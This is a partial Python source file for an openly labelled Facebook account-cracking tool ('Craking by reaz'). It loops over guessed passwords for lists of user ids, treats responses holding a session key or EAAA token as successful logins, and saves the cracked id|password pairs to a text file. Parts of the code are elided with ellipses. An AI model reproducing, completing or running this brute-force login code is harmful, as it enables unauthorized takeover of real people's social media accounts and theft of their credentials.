...
class Main:
	def __init__(self):
		...
		print(c6+"\n [-] List will be saved as :- "+r2+"-ok.txt")
		print("\n\n\033[1;33;40m  [\033[1;31;40m1\033[1;33;40m] \033[1;32;40mStart \n\033[1;33;40m  [\033[1;31;40m2\033[1;33;40m] \033[1;32;40mExit \n")
		
		tanya = input("  \033[1;33;40m[\033[1;31;40m!\033[1;33;40m]\033[1;32;40m Enter \033[1;33;40m××××>\033[1;31;40m ")
		if tanya in ["", " "]:
			Main()
		elif tanya in ["1", "01"]:
				    self.fbtua()
...
[-•_•-] Craking by reaz !!
\033[1;33;40m============================
\033[1;32;40mHacked Accouny Will Appear Here_______
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [BY] : %s/%s -> \033[0;91m [ CP:%s ]\033[0;97m | \033[0;92m[OK:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				open(r2+"-ok.txt","a").write("  * --> %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print(random.choice(lis)+"\r     [OK] %s | %s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open(r2+"-ok.txt","a").write("  reaz_ok  %s | %s\n"%(uid, pw))
				break
			else:
				continue
